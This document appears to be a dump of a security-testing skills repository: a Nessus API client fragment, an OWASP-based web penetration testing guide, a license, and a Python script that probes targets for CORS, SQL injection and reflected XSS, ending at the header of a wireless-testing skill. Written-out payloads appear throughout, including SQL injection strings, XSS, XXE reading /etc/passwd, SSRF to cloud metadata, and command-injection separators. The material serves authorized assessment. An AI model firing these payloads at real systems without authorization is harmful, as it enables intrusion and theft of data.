            "policy": info.get("policy"),
            "severity_counts": {
                "critical": sum(1 for v in vulns if v.get("severity") == 4),
                "high": sum(1 for v in vulns if v.get("severity") == 3),
                "medium": sum(1 for v in vulns if v.get("severity") == 2),
                "low": sum(1 for v in vulns if v.get("severity") == 1),
                "info": sum(1 for v in vulns if v.get("severity") == 0),
            },
            "vulnerabilities": [
                {
                    "plugin_id": v["plugin_id"],
                    "name": v["plugin_name"],
                    "severity": v["severity"],
                    "count": v["count"],
                    "family": v.get("plugin_family"),
                }
                for v in sorted(vulns, key=lambda x: -x.get("severity", 0))[:50]
            ],
        }

    def create_scan(self, name, targets, policy_id=None, template="advanced"):
        templates = self._get("/editor/scan/templates")
        template_uuid = None
        for t in templates.get("templates", []):
            if t["name"] == template:
                template_uuid = t["uuid"]
                break
        if not template_uuid:
            template_uuid = templates["templates"][0]["uuid"]
        scan_config = {
            "uuid": template_uuid,
            "settings": {
                "name": name,
                "text_targets": targets,
                "launch_now": False,
            },
        }
        if policy_id:
            scan_config["settings"]["policy_id"] = policy_id
        return self._post("/scans", scan_config)

    def launch_scan(self, scan_id):
        return self._post(f"/scans/{scan_id}/launch")

    def get_scan_status(self, scan_id):
        data = self._get(f"/scans/{scan_id}")
        return data.get("info", {}).get("status", "unknown")

    def wait_for_scan(self, scan_id, poll_interval=30, timeout=7200):
        elapsed = 0
        while elapsed < timeout:
            status = self.get_scan_status(scan_id)
            if status == "completed":
                return True
            if status in ("canceled", "aborted"):
                return False
            time.sleep(poll_interval)
            elapsed += poll_interval
        return False

    def export_scan(self, scan_id, fmt="csv"):
        data = self._post(f"/scans/{scan_id}/export", {"format": fmt})
        file_id = data.get("file")
        if not file_id:
            return None
        while True:
            status = self._get(f"/scans/{scan_id}/export/{file_id}/status")
            if status.get("status") == "ready":
                break
            time.sleep(5)
        resp = self.session.get(f"{self.url}/scans/{scan_id}/export/{file_id}/download", timeout=30)
        return resp.content

    def check_auth_status(self, scan_id):
        """Check if authenticated scanning succeeded per host."""
        data = self._get(f"/scans/{scan_id}")
        auth_results = []
        for host in data.get("hosts", []):
            host_id = host["host_id"]
            host_detail = self._get(f"/scans/{scan_id}/hosts/{host_id}")
            auth_info = None
            for vuln in host_detail.get("vulnerabilities", []):
                if vuln["plugin_id"] == 19506:
                    auth_info = vuln
                    break
            auth_results.append({
                "hostname": host.get("hostname"),
                "host_id": host_id,
                "critical": host.get("critical", 0),
                "high": host.get("high", 0),
                "authenticated": auth_info is not None,
            })
        return auth_results


def print_scan_report(details):
    print("Vulnerability Scan Report")
    print("=" * 50)
    print(f"Scan: {details['name']}")
    print(f"Status: {details['status']}")
    print(f"Hosts: {details['host_count']}")
    print(f"Targets: {details['targets']}")
    sev = details["severity_counts"]
    print(f"\nSeverity Summary:")
    print(f"  Critical: {sev['critical']}")
    print(f"  High:     {sev['high']}")
    print(f"  Medium:   {sev['medium']}")
    print(f"  Low:      {sev['low']}")
    print(f"  Info:     {sev['info']}")
    print(f"\nTop Vulnerabilities:")
    for v in details["vulnerabilities"][:15]:
        sev_label = {4: "CRIT", 3: "HIGH", 2: "MED", 1: "LOW", 0: "INFO"}.get(v["severity"], "?")
        print(f"  [{sev_label}] {v['name']} (plugin {v['plugin_id']}, count: {v['count']})")


if __name__ == "__main__":
    nessus_url = os.environ.get("NESSUS_URL", "https://localhost:8834")
    access_key = os.environ.get("NESSUS_ACCESS_KEY", "")
    secret_key = os.environ.get("NESSUS_SECRET_KEY", "")
    api = NessusAPI(nessus_url, access_key, secret_key)
    scans = api.list_scans()
    if scans:
        details = api.get_scan_details(scans[0]["id"])
        print_scan_report(details)
    else:
        print("No scans found. Create one with api.create_scan()")

===== END FILE =====


===== FILE: skills/performing-web-application-penetration-test/SKILL.md =====
---
name: performing-web-application-penetration-test
description: 'Performs systematic security testing of web applications following the
  OWASP Web Security Testing Guide (WSTG) methodology to identify vulnerabilities
  in authentication, authorization, input validation, session management, and business
  logic. The tester uses Burp Suite as the primary interception proxy alongside manual
  testing techniques to find flaws that automated scanners miss. Activates for requests
  involving web app pentest, OWASP testing, application security assessment, or web
  vulnerability testing.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- web-application-pentest
- OWASP
- Burp-Suite
- WSTG
- application-security
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
---
# Performing Web Application Penetration Test

## When to Use

- Testing web applications before production deployment to identify exploitable vulnerabilities
- Conducting compliance-driven security assessments (PCI-DSS requirement 6.6, SOC 2 Type II)
- Validating remediation of previously identified web application vulnerabilities during retesting
- Assessing third-party web applications before integration into the organization's environment
- Evaluating custom-developed web applications where automated scanning alone is insufficient

**Do not use** against web applications without written authorization, against production systems during peak traffic hours without explicit approval, or for denial-of-service testing of web infrastructure.

## Prerequisites

- Signed statement of work (SoW) defining the target application URLs, environments (staging/production), and testing boundaries
- Burp Suite Professional license with up-to-date extensions (Active Scan++, Autorize, JSON Beautifier, Logger++)
- Valid test accounts at each privilege level (unauthenticated, standard user, administrator) for authorization testing
- Application documentation including API specifications (OpenAPI/Swagger), sitemap, and technology stack details
- Browser configured with Burp Suite proxy (FoxyProxy recommended) and Burp CA certificate installed

## Workflow

### Step 1: Reconnaissance and Application Mapping

Map the entire attack surface of the web application:

- Configure Burp Suite proxy and spider the application by browsing every page, form, and function manually while Burp captures the sitemap
- Use Burp's Discover Content feature to find hidden directories and files not linked from the visible application
- Identify the technology stack from response headers (`X-Powered-By`, `Server`), cookies (JSESSIONID = Java, PHPSESSID = PHP, ASP.NET_SessionId = .NET), and page extensions
- Enumerate endpoints using `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://target.com/FUZZ -mc 200,301,302,403`
- Review JavaScript files for hardcoded API endpoints, secrets, and client-side routing using Burp's JS Link Finder extension or `LinkFinder.py`
- Document all entry points: URL parameters, POST bodies, HTTP headers, cookies, file uploads, and WebSocket connections

### Step 2: Authentication Testing

Test authentication mechanisms for weaknesses:

- **Credential enumeration**: Submit valid and invalid usernames to identify differences in response (timing, message, HTTP status) that reveal valid accounts
- **Brute force protection**: Attempt 10-20 rapid login attempts with invalid credentials to verify account lockout and rate limiting are enforced
- **Password policy**: Test password creation with weak passwords (123456, password, single character) to verify policy enforcement
- **Multi-factor authentication bypass**: Test for MFA bypass by directly accessing post-authentication pages, manipulating MFA tokens, or replaying successful MFA responses
- **Session fixation**: Note the session token before and after authentication. If the token does not change after login, session fixation is possible
- **Remember me functionality**: Inspect persistent authentication tokens for predictability, encryption, and proper expiration
- **Password reset**: Test the password reset flow for token predictability, token expiration, account enumeration via the reset form, and host header injection

### Step 3: Authorization Testing

Verify that access controls are properly enforced:

- **Horizontal privilege escalation (IDOR)**: Using Account A, capture requests that access Account A's resources. Replay those requests substituting Account B's identifiers (user IDs, order numbers, filenames). Use Burp's Autorize extension to automate this across all endpoints.
- **Vertical privilege escalation**: Using a low-privilege account, attempt to access administrative functions by directly browsing to admin URLs, modifying role parameters in requests, or manipulating JWT claims
- **Forced browsing**: Attempt to access resources that should require authentication by directly navigating to internal URLs collected during mapping
- **HTTP method tampering**: If GET is blocked on an endpoint, try PUT, POST, DELETE, PATCH, or use method override headers (`X-HTTP-Method-Override: DELETE`)
- **Path traversal in authorization**: Test URL path manipulation (`/api/users/123/../456/profile`) to bypass path-based authorization checks

### Step 4: Input Validation and Injection Testing

Test all input points for injection vulnerabilities:

- **SQL injection**: Insert payloads like `' OR 1=1--`, `' UNION SELECT NULL,NULL--`, and time-based blind payloads (`'; WAITFOR DELAY '0:0:5'--`) into every parameter. Use sqlmap for automated detection and exploitation of confirmed injection points.
- **Cross-Site Scripting (XSS)**: Test reflected, stored, and DOM-based XSS with payloads like `<script>alert(document.domain)</script>`, `"><img src=x onerror=alert(1)>`, and event handlers. Test in all contexts: HTML body, attributes, JavaScript, and URLs.
- **Server-Side Request Forgery (SSRF)**: Supply internal URLs (`http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:6379/`) in parameters that fetch external resources (webhooks, image URLs, import functions)
- **Command injection**: Insert OS command separators (`;`, `|`, `&&`, `` ` ``) followed by commands (`id`, `whoami`, `ping -c 3 collaborator.net`) in parameters processed by the server
- **XML External Entity (XXE)**: Submit XML payloads with external entity declarations (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`) in XML upload or API endpoints
- **Server-Side Template Injection (SSTI)**: Test with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in parameters rendered by template engines

### Step 5: Session Management Testing

Evaluate the security of session handling:

- **Session token analysis**: Collect 100+ session tokens and analyze for randomness using Burp Sequencer. Check token length (minimum 128 bits of entropy), character set, and predictability.
- **Session expiration**: Verify that sessions expire after a defined idle timeout and absolute timeout. Test by capturing a session token, waiting beyond the timeout, and replaying.
- **Cookie security flags**: Verify `Secure`, `HttpOnly`, and `SameSite` flags are set on session cookies. Missing `HttpOnly` enables XSS-based session theft. Missing `SameSite` enables CSRF.
- **CSRF testing**: Identify state-changing operations (password change, email update, fund transfer) and test if they can be triggered from a cross-origin page without a valid CSRF token
- **Concurrent session handling**: Test if the application limits the number of concurrent sessions and if logging in from a new location invalidates the previous session

### Step 6: Business Logic Testing

Test application-specific logic flaws that automated scanners cannot detect:

- **Race conditions**: Send multiple simultaneous requests to exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities (double-spending, coupon reuse, voting multiple times) using Burp Turbo Intruder
- **Workflow bypass**: Attempt to skip steps in multi-step processes (checkout, registration, approval) by directly requesting later-stage endpoints
- **Numeric manipulation**: Modify prices, quantities, or amounts to negative values, zero, or extremely large numbers to test for integer overflow or logic errors
- **File upload bypass**: Test file upload restrictions by modifying MIME types, double extensions (file.php.jpg), null bytes (file.php%00.jpg), and content-type manipulation

### Step 7: Report and Remediation Guidance

Compile all findings into a structured report:

- Write an executive summary describing the overall application security posture in business terms
- Document each finding with title, severity (CVSS 3.1), affected URL/parameter, description, reproduction steps, screenshots, and HTTP request/response pairs from Burp
- Provide specific remediation guidance for each finding including code-level fixes where applicable
- Include a risk matrix showing the distribution of findings by severity
- Deliver the report securely (encrypted, not via email attachment) and schedule a findings walkthrough with the development team

## Key Concepts

| Term | Definition |
|------|------------|
| **OWASP WSTG** | The Web Security Testing Guide; a comprehensive open-source guide to testing web application security organized by test category (authentication, authorization, input validation, etc.) |
| **IDOR** | Insecure Direct Object Reference; a vulnerability where the application exposes internal object identifiers and fails to verify the requesting user is authorized to access that object |
| **CSRF** | Cross-Site Request Forgery; an attack that forces an authenticated user's browser to send a forged request to a vulnerable web application |
| **Session Fixation** | An attack where the attacker sets a user's session ID to a known value before the user authenticates, then hijacks the session after login |
| **Forced Browsing** | Attempting to access application resources by directly requesting URLs not linked from the visible application, bypassing intended access controls |
| **SSTI** | Server-Side Template Injection; injecting template directives into server-side template engines to achieve remote code execution |

## Tools & Systems

- **Burp Suite Professional**: Primary web application testing proxy providing interception, scanning, and manual testing tools including Repeater, Intruder, and Sequencer
- **ffuf**: Fast web fuzzer for directory/file discovery, parameter fuzzing, and virtual host enumeration
- **sqlmap**: Automated SQL injection detection and exploitation tool supporting all major database engines and injection techniques
- **Nuclei**: Template-based vulnerability scanner with community-maintained templates for known CVEs and misconfigurations
- **SecLists**: Curated collection of wordlists for fuzzing, credential testing, and payload delivery used throughout web application testing

## Common Scenarios

### Scenario: E-Commerce Application Pre-Launch Security Assessment

**Context**: A retail company is launching a new e-commerce platform built on Node.js with a React frontend and PostgreSQL database. The application handles credit card payments through Stripe integration and stores customer PII. Testing scope includes the staging environment with full API access.

**Approach**:
1. Map the application through manual browsing and API documentation review, identifying 47 unique endpoints
2. Test authentication flows including social login (OAuth), standard login, and password reset
3. Discover IDOR vulnerability in the order retrieval API (`/api/orders/{orderId}`) where any authenticated user can view any order by iterating order IDs
4. Identify stored XSS in the product review feature that executes when administrators view the admin dashboard
5. Find SSRF in the product image import function that allows reading AWS EC2 instance metadata
6. Test payment logic by manipulating price values in the client-side cart before checkout submission
7. Report all findings with specific Node.js code-level remediation (parameterized queries, input sanitization with DOMPurify, authorization middleware)

**Pitfalls**:
- Testing only the frontend while ignoring the API layer that lacks independent authorization checks
- Missing business logic flaws by relying solely on automated scanning without manual testing
- Not testing the same functionality across different privilege levels to catch authorization issues
- Overlooking client-side JavaScript for hardcoded API keys, debug endpoints, and internal URLs

## Output Format

```
## Finding: Insecure Direct Object Reference in Order API

**ID**: WEB-003
**Severity**: High (CVSS 7.5)
**Affected URL**: GET /api/v1/orders/{orderId}
**Parameter**: orderId (path parameter)

**Description**:
The order retrieval endpoint does not verify that the authenticated user owns
the requested order. Any authenticated user can access any order's details
including customer name, shipping address, email, phone number, and order
items by incrementing the orderId path parameter.

**Reproduction Steps**:
1. Authenticate as user A (testuser@example.com)
2. Note user A's order ID: 10451
3. Send GET /api/v1/orders/10452 with user A's session token
4. Observe that user B's order details are returned with full PII

**HTTP Request**:
GET /api/v1/orders/10452 HTTP/1.1
Host: staging.example.com
Authorization: Bearer eyJhbGc....[User A's token]

**HTTP Response** (truncated):
HTTP/1.1 200 OK
{"orderId":10452,"customerName":"Jane Smith","email":"jane@...","address":"123 Main St"}

**Impact**:
An attacker can enumerate all customer orders and extract PII (names, emails,
addresses, phone numbers) for an estimated 25,000 customers.

**Remediation**:
Add authorization middleware that verifies the authenticated user's ID matches
the order's userId field before returning order data. Implement UUIDs instead
of sequential integers for order identifiers to prevent enumeration.
```

===== END FILE =====


===== FILE: skills/performing-web-application-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-web-application-penetration-test/references/api-reference.md =====
# API Reference: Web Application Penetration Test Agent

## Overview

Performs automated web application security testing: technology fingerprinting, security header checks, HTTP method testing, CORS misconfiguration detection, basic SQL injection, and reflected XSS testing.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| requests | >= 2.28 | HTTP client for all web tests |

## External Tools (Optional)

| Tool | Purpose |
|------|---------|
| ffuf | Directory and file brute-forcing |

## Core Functions

### `fingerprint_technology(target_url)`
Identifies server, framework, and language from headers and cookie names.
- **Returns**: `dict` with `server` and `technologies` list

### `check_security_headers(target_url)`
Checks HSTS, CSP, X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy.
- **Returns**: `dict[str, dict]` - header to presence/value mapping

### `test_http_methods(target_url)`
Tests for dangerous HTTP methods (PUT, DELETE, TRACE, CONNECT).
- **Returns**: `list[dict]` - allowed dangerous methods with risk levels

### `test_cors_config(target_url)`
Tests CORS with evil origins, null origin, and subdomain spoofing.
- **Returns**: `list[dict]` - reflected origins with credential risks

### `run_directory_bruteforce(target_url, wordlist)`
Subprocess wrapper for ffuf directory enumeration.
- **Default wordlist**: `/usr/share/seclists/Discovery/Web-Content/common.txt`

### `test_sql_injection_basic(target_url, params)`
Tests URL parameters with SQL injection payloads and checks for database error strings.
- **Risk**: CRITICAL when SQL error patterns detected

### `test_xss_basic(target_url, params)`
Tests for reflected XSS by checking if payloads appear unescaped in response body.
- **Risk**: HIGH when payload is reflected

### `run_assessment(target_url, test_params)`
Full assessment pipeline with summary statistics.

## OWASP Test Coverage

| OWASP Category | Tests Performed |
|----------------|----------------|
| A01 Broken Access Control | CORS, HTTP methods |
| A03 Injection | SQL injection, XSS |
| A05 Security Misconfiguration | Security headers, HTTP methods |

## Usage

```bash
python agent.py https://target-app.example.com
```

===== END FILE =====


===== FILE: skills/performing-web-application-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
"""Web application penetration test agent using requests and subprocess."""

import subprocess
import sys
import json
import os
from urllib.parse import urlparse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)


def fingerprint_technology(target_url):
    """Identify technology stack from response headers and cookies."""
    try:
        resp = requests.get(target_url, timeout=10, verify=False, allow_redirects=True)
    except RequestException as e:
        return {"error": str(e)}
    headers = dict(resp.headers)
    tech = {"server": headers.get("Server", "Unknown"), "technologies": []}
    if "X-Powered-By" in headers:
        tech["technologies"].append(headers["X-Powered-By"])
    cookies = resp.cookies.get_dict()
    cookie_tech = {
        "JSESSIONID": "Java", "PHPSESSID": "PHP",
        "ASP.NET_SessionId": "ASP.NET", "csrftoken": "Django",
        "laravel_session": "Laravel", "_rails_session": "Ruby on Rails",
    }
    for cookie_name, framework in cookie_tech.items():
        if cookie_name in cookies:
            tech["technologies"].append(framework)
    return tech


def check_security_headers(target_url):
    """Check for presence of security headers."""
    try:
        resp = requests.get(target_url, timeout=10, verify=False)
    except RequestException as e:
        return {"error": str(e)}
    required_headers = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "Clickjacking protection",
        "X-XSS-Protection": "XSS filter",
        "Referrer-Policy": "Referrer control",
        "Permissions-Policy": "Feature policy",
    }
    results = {}
    for header, desc in required_headers.items():
        value = resp.headers.get(header)
        results[header] = {
            "present": value is not None,
            "value": value,
            "description": desc,
        }
    return results


def test_http_methods(target_url):
    """Test for dangerous HTTP methods."""
    dangerous = ["PUT", "DELETE", "TRACE", "CONNECT"]
    results = []
    for method in dangerous:
        try:
            resp = requests.request(method, target_url, timeout=5, verify=False)
            if resp.status_code not in (405, 501):
                results.append({
                    "method": method, "status": resp.status_code,
                    "risk": "HIGH" if method in ("PUT", "DELETE") else "MEDIUM",
                })
        except RequestException:
            pass
    try:
        resp = requests.options(target_url, timeout=5, verify=False)
        allow = resp.headers.get("Allow", "")
        results.append({"method": "OPTIONS", "allow_header": allow})
    except RequestException:
        pass
    return results


def test_cors_config(target_url):
    """Test CORS configuration for misconfigurations."""
    tests = []
    origins = [
        "https://evil.com",
        "null",
        urlparse(target_url).scheme + "://" + urlparse(target_url).hostname + ".evil.com",
    ]
    for origin in origins:
        try:
            resp = requests.get(
                target_url, headers={"Origin": origin},
                timeout=5, verify=False
            )
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == origin or acao == "*":
                tests.append({
                    "origin": origin, "reflected": True,
                    "allow_credentials": acac.lower() == "true",
                    "risk": "HIGH" if acac.lower() == "true" else "MEDIUM",
                })
        except RequestException:
            pass
    return tests


def run_directory_bruteforce(target_url, wordlist=None):
    """Run directory enumeration using ffuf if available."""
    if wordlist is None:
        wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
    if not os.path.exists(wordlist):
        return {"error": f"Wordlist not found: {wordlist}"}
    try:
        result = subprocess.run(
            ["ffuf", "-w", wordlist, "-u", f"{target_url}/FUZZ",
             "-mc", "200,301,302,403", "-t", "20", "-o", "/tmp/ffuf_output.json",
             "-of", "json", "-s"],
            capture_output=True, text=True, timeout=120
        )
        if os.path.exists("/tmp/ffuf_output.json"):
            with open("/tmp/ffuf_output.json") as f:
                return json.load(f)
        return {"stdout": result.stdout[:1000]}
    except FileNotFoundError:
        return {"error": "ffuf not installed"}
    except subprocess.TimeoutExpired:
        return {"error": "ffuf timeout"}


def test_sql_injection_basic(target_url, params):
    """Test for basic SQL injection indicators."""
    payloads = ["'", "' OR '1'='1", "1 OR 1=1--", "'; DROP TABLE--"]
    sql_errors = [
        "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
        "microsoft ole db", "unclosed quotation", "syntax error",
    ]
    findings = []
    for param_name in params:
        for payload in payloads:
            test_params = {param_name: payload}
            try:
                resp = requests.get(target_url, params=test_params, timeout=10, verify=False)
                body_lower = resp.text.lower()
                for err in sql_errors:
                    if err in body_lower:
                        findings.append({
                            "parameter": param_name, "payload": payload,
                            "error_pattern": err, "status": resp.status_code,
                            "risk": "CRITICAL",
                        })
                        break
            except RequestException:
                pass
    return findings


def test_xss_basic(target_url, params):
    """Test for basic reflected XSS."""
    payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
    ]
    findings = []
    for param_name in params:
        for payload in payloads:
            try:
                resp = requests.get(
                    target_url, params={param_name: payload},
                    timeout=10, verify=False
                )
                if payload in resp.text:
                    findings.append({
                        "parameter": param_name, "payload": payload,
                        "reflected": True, "risk": "HIGH",
                    })
            except RequestException:
                pass
    return findings


def run_assessment(target_url, test_params=None):
    """Run web application security assessment."""
    if test_params is None:
        test_params = ["id", "q", "search", "page", "user"]
    report = {
        "target": target_url,
        "technology": fingerprint_technology(target_url),
        "security_headers": check_security_headers(target_url),
        "http_methods": test_http_methods(target_url),
        "cors": test_cors_config(target_url),
        "sqli_findings": test_sql_injection_basic(target_url, test_params),
        "xss_findings": test_xss_basic(target_url, test_params),
    }
    missing_headers = [
        h for h, v in report["security_headers"].items()
        if isinstance(v, dict) and not v.get("present", True)
    ]
    report["summary"] = {
        "missing_security_headers": len(missing_headers),
        "dangerous_methods": len(report["http_methods"]),
        "cors_issues": len(report["cors"]),
        "sqli_findings": len(report["sqli_findings"]),
        "xss_findings": len(report["xss_findings"]),
    }
    return report


def print_report(report):
    print("Web Application Penetration Test Report")
    print("=" * 50)
    print(f"Target: {report['target']}")
    tech = report["technology"]
    print(f"Server: {tech.get('server', 'Unknown')}")
    if tech.get("technologies"):
        print(f"Stack: {', '.join(tech['technologies'])}")
    print("\nSecurity Headers:")
    for h, v in report["security_headers"].items():
        if isinstance(v, dict):
            status = "PRESENT" if v.get("present") else "MISSING"
            print(f"  {h}: {status}")
    if report["sqli_findings"]:
        print(f"\nSQL Injection: {len(report['sqli_findings'])} finding(s)")
        for f in report["sqli_findings"]:
            print(f"  [{f['risk']}] {f['parameter']}: {f['error_pattern']}")
    if report["xss_findings"]:
        print(f"\nXSS: {len(report['xss_findings'])} finding(s)")
        for f in report["xss_findings"]:
            print(f"  [{f['risk']}] {f['parameter']}: reflected")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    result = run_assessment(target)
    print_report(result)

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/SKILL.md =====
---
name: performing-wireless-network-penetration-test
description: Execute a wireless network penetration test to assess WiFi security by
  capturing handshakes, cracking WPA2/WPA3 keys, detecting rogue access points, and
  testing wireless segmentation using Aircrack-ng and related tools.
domain: cybersecurity
subdomain: penetration-testing
tags:
- wireless-pentest
- WiFi
- Aircrack-ng
- WPA2
- WPA3
- rogue-AP
- evil-twin
- 802.11
- Kismet
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1591
---

# Performing Wireless Network Penetration Test

## Overview

